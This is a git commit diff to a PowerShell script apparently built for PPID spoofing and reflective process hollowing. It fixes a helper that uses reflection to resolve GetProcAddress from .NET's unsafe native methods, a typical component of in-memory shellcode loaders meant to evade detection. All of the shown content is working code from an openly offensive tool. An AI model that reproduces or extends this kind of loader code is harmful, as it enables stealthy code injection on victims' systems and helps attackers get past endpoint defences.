a7da8b12ec723be11eb4d15f48cd00e00b378033
BagelTap <47883976+bowtiejicode@users.noreply.github.com>
2023-01-14 14:29:57 +0800

    Get the correct GetProcAddress
    Get the correct GetProcAddress

--- Reflective-PPIDxProcHollow_v1.2.ps1
+++ Reflective-PPIDxProcHollow_v1.2.ps1
@@ -79,7 +79,7 @@ function LookupFunc {
  Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
  Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
  $tmp=@()
- $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
+ $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {If($_.ToString().Contains("IntPtr, System.String")){$tmp+=$_}}}
  return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,
 @($moduleName)), $functionName))
 }
